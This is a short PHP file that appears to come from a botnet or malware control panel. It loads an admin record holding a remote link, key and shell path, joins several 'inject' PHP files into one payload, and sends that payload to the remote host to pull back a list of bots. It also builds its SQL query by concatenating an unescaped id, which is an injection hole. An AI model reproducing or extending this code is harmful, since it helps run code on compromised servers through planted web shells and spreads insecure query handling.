<?php

$smarty->assign('rand_name', mt_rand(0000000000, 9999999999));

if(!empty($Cur['id'])){
	$result = $mysqli->query("SELECT id, link, keyid, shell FROM bf_admins WHERE (id='".$Cur['id']."')");
	if($result->id == $Cur['id']){
		$get_php = '$cur_file = \''.$result->shell.'\';';
		$get_php .= file_get_contents('modules/admins/injects/start.php');
		$get_php .= file_get_contents('modules/admins/injects/mysqli.php');
		$get_php .= file_get_contents('modules/admins/injects/cmd_info_prefix.php');
		$bots = get_http($result->link, $get_php, $result->keyid, $result->shell);
		//print_r(json_decode($bots));
		$smarty->assign('admin', $result);
		$smarty->assign('bots', json_decode($bots));
	}
}

?>